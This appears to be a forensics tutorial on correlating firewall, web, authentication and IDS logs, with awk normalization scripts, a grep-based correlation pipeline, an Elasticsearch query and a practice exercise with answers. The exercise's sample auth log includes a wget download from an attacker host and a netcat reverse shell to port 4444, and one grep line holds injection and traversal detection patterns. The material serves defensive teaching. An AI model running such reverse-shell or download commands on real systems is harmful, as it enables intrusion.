Why Correlation Matters

A single log source tells a fragment of the story. The firewall log shows a connection. The web server log shows a request. The authentication log shows a login. Only by correlating these fragments across sources can you reconstruct the complete attack narrative. Log correlation is the process of linking related events from different sources to build a unified picture of what happened.

The challenge is that each log source uses different formats, timestamps, and field names. An IP address in Apache logs might appear as "client" while the same address appears as "src_ip" in a firewall log and "IpAddress" in a Windows Event Log. Effective correlation requires normalizing these differences.

Correlation Dimensions

Events can be correlated across four primary dimensions. The strongest forensic conclusions use multiple dimensions simultaneously.

Time-Based Correlation Events occurring within a narrow time window across sources likely relate to the same activity. Account for clock skew between systems -- NTP synchronization is never perfect.
User-Based Correlation Track a single user account across authentication logs, application logs, and audit trails. Watch for the same username appearing on systems where it should not exist.
IP-Based Correlation Follow a source IP through firewall logs, web server logs, VPN logs, and IDS alerts. An IP seen in a web attack should also appear in the firewall allow/deny logs.
Session-Based Correlation Session IDs, logon IDs (Windows 4624 LogonId field), or SSH session PIDs tie multiple events to a single authenticated session.

Clock Skew Warning

Before correlating events across sources, determine the time offset between systems. A 3-second skew between your web server and firewall means events that appear simultaneous may be logged 3 seconds apart. Document all observed clock skews and apply corrections during analysis. NTP drift logs and system time configuration should be collected as evidence.

Log Normalization

Different log sources use different timestamp formats and field names. Before correlation, you must normalize to a common format.

Source Timestamp Format Normalized ISO 8601
Apache access.log [15/Mar/2026:14:23:01 +0000] 2026-03-15T14:23:01Z
Linux syslog Mar 15 14:23:01 2026-03-15T14:23:01Z (year inferred)
Windows EVTX 2026-03-15T14:23:01.432Z 2026-03-15T14:23:01Z
Firewall (epoch) 1773847381 Convert with date -d @1773847381
IDS (Suricata) 2026-03-15T14:23:01.432123+0000 2026-03-15T14:23:01Z
Normalizing Timestamps with awk
# Convert Apache timestamp to ISO 8601
awk -F'[][]' '{
    split($2, dt, "[/: ]")
    mon = (index("JanFebMarAprMayJunJulAugSepOctNovDec", dt[2])+2)/3
    printf "%s-%02d-%sT%s:%s:%s\t%s\n", dt[3], mon, dt[1], dt[4], dt[5], dt[6], $0
}' access.log | sort -t'T' -k1

# Convert syslog timestamp (add year manually)
awk '{
    mon_map["Jan"]=1; mon_map["Feb"]=2; mon_map["Mar"]=3;
    printf "2026-%02d-%02dT%s\t%s\n", mon_map[$1], $2, $3, $0
}' auth.log

The Pivot Table Approach

The pivot table approach organizes evidence around a central identifier and tracks its presence across all log sources. Start with a known indicator (an IP, username, or file hash) and pivot outward to discover related activity.

Pivot Point Firewall Web Server Auth Log IDS
10.0.0.88 ALLOW tcp/443 at 02:14 GET /admin at 02:14 SSH login at 02:17 SQL injection alert at 02:15
10.0.0.88 ALLOW tcp/22 at 02:17 POST /upload at 02:15 sudo at 02:18 Webshell alert at 02:16
maintenance -- -- useradd at 02:19 --

By organizing events around the pivot point (IP 10.0.0.88), the attack narrative becomes clear across all four sources. Each source fills gaps that the others miss.

Common Correlation Patterns

Certain event sequences, when correlated across sources, are strong indicators of specific attack techniques:

Brute Force + Compromise Multiple failed logins (auth.log/4625) from IP X, followed by successful login (4624) from same IP, followed by privilege escalation (sudo/4672). Time window: minutes to hours.
Web Exploit + Pivot Suspicious web requests (access.log) from IP X, followed by reverse shell connection (firewall outbound), followed by internal scanning (IDS lateral movement alerts).
Phishing + Credential Theft Email delivery (mail log), link click (proxy log), credential entry (web log), VPN login from unusual location (VPN log), mailbox access (Exchange log).
Data Exfiltration Large file access (audit log), DNS queries to unusual domains (DNS log), large outbound transfers (firewall bytes), all within a short window from the same host.

Command-Line Correlation Tools

grep/awk Correlation Pipeline
# Step 1: Extract all IPs from web attack logs
grep "union.*select\|/etc/passwd\|\.\./" access.log | awk '{print $1}' | sort -u > suspect_ips.txt

# Step 2: Search those IPs across all log sources
while read ip; do
    echo "=== $ip ==="
    echo "--- Firewall ---"
    grep "$ip" firewall.log | tail -5
    echo "--- Auth ---"
    grep "$ip" auth.log | tail -5
    echo "--- IDS ---"
    grep "$ip" suricata/eve.json | tail -5
done < suspect_ips.txt

# Step 3: Create unified timeline sorted by timestamp
(
    awk '{print "FIREWALL\t" $0}' firewall_normalized.log
    awk '{print "WEBSVR\t" $0}' access_normalized.log
    awk '{print "AUTH\t" $0}' auth_normalized.log
) | sort -t'T' -k1 | grep "10.0.0.88"
Elasticsearch Correlation Query
# Find all events related to IP within a time window
GET /logs-*/_search
{
  "query": {
    "bool": {
      "must": [
        { "term": { "source.ip": "10.0.0.88" } },
        { "range": {
            "@timestamp": {
              "gte": "2026-03-15T02:00:00Z",
              "lte": "2026-03-15T03:00:00Z"
            }
          }
        }
      ]
    }
  },
  "sort": [{ "@timestamp": "asc" }],
  "size": 1000
}

Practice: Correlate Events Across 3 Log Sources

Given the following entries from three different sources, build a correlated timeline and identify the attack:

# Source 1: Firewall log (normalized timestamps)
2026-03-15T10:31:02Z ALLOW 203.0.113.50 -> 10.1.1.20:443 TCP
2026-03-15T10:34:18Z ALLOW 203.0.113.50 -> 10.1.1.20:22 TCP
2026-03-15T10:38:44Z ALLOW 10.1.1.20 -> 203.0.113.50:4444 TCP

# Source 2: Web server access.log
2026-03-15T10:31:05Z 203.0.113.50 POST /api/v1/login 200 45ms
2026-03-15T10:31:08Z 203.0.113.50 GET /api/v1/admin/users 200 12ms
2026-03-15T10:31:45Z 203.0.113.50 POST /api/v1/admin/exec 200 2341ms

# Source 3: Linux auth.log
2026-03-15T10:34:20Z sshd: Accepted publickey for deploy from 203.0.113.50
2026-03-15T10:35:01Z sudo: deploy : COMMAND=/usr/bin/wget http://203.0.113.50/tools.tar.gz
2026-03-15T10:38:42Z deploy: /tmp/tools/nc -e /bin/bash 203.0.113.50 4444
  1. What is the attack entry point?
  2. How did the attacker escalate access?
  3. What is the outbound connection at 10:38?
  4. What pivot points tie the three sources together?

Answers: (1) Web API authentication bypass at 10:31, gaining admin API access. (2) Used admin exec endpoint to obtain SSH credentials, then SSH login as "deploy" with sudo access. (3) Reverse shell -- the server initiated outbound connection to attacker on port 4444. (4) IP 203.0.113.50 ties all three sources; time proximity (7-minute window) confirms a single attack session.

Key Takeaways

  • Single log sources tell incomplete stories -- correlation across sources is essential
  • Correlate by time, user, IP address, and session ID for strongest conclusions
  • Normalize timestamps to ISO 8601 (UTC) before attempting cross-source analysis
  • Clock skew between systems must be documented and compensated for
  • The pivot table approach organizes evidence around a central indicator
  • Common attack patterns (brute force, web exploit, phishing) have predictable multi-source signatures
  • grep/awk pipelines and Elasticsearch queries are practical correlation tools
